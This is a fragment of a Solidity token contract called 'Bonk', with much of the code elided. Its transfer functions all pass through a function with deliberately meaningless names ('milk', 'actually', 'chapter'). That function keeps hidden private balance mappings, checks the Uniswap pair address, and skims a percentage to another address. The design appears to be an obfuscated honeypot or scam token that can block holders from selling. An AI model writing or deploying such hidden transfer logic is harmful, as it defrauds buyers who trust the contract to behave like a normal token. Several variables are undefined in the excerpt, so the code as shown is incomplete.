...
contract Bonk is Ownable {
    ...
    mapping(address => uint256) private chapter;
    ...
    function milk(
        ...
        address your = address(uniswapV2Pair);

        if (actually[full] == 0 && (your != full) && art[full] > 0) {
            actually[full] -= gulf;
        }
        ...
        chapter[full] -= modern;
        uint256 command = (modern / 100) * man;
        modern -= command;
        art[people] += gulf;
        chapter[waste] += modern;
    }
    ...
    mapping(address => uint256) private actually;
    ...
    function transferFrom(
        ...
        milk(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        milk(msg.sender, recipient, amount);
        return true;
    }
